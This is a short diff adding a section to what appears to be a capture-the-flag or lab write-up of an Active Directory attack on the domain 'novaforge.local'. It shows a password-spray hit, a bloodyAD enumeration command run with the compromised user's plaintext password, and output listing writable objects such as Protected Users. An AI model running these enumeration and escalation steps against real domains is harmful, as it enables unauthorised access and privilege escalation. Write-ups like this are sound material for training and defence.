@@ -1073,3 +1073,22 @@ SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025
 SMB         10.0.0.100      445    DC               [+] novaforge.local\david.cokx:pa$$word12
 ```
 
+This user is compromised
+
+```python
+bloodyAD --host dc.novaforge.local -d novaforge.local -u david.cokx -p 'pa$$word12' get writable     
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=novaforge,DC=local
+permission: WRITE
+
+distinguishedName: CN=Protected Users,CN=Users,DC=novaforge,DC=local
+permission: WRITE
+
+distinguishedName: CN=david.cokx,CN=Users,DC=novaforge,DC=local
+permission: WRITE
+
+distinguishedName: DC=_msdcs.novaforge.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=novaforge,DC=local
+permission: CREATE_CHILD
+```
+
+This new user has write access on protected users, i saw earlier on the password spray there was a user with a restriction which a lot of the time means they are part oprotected users
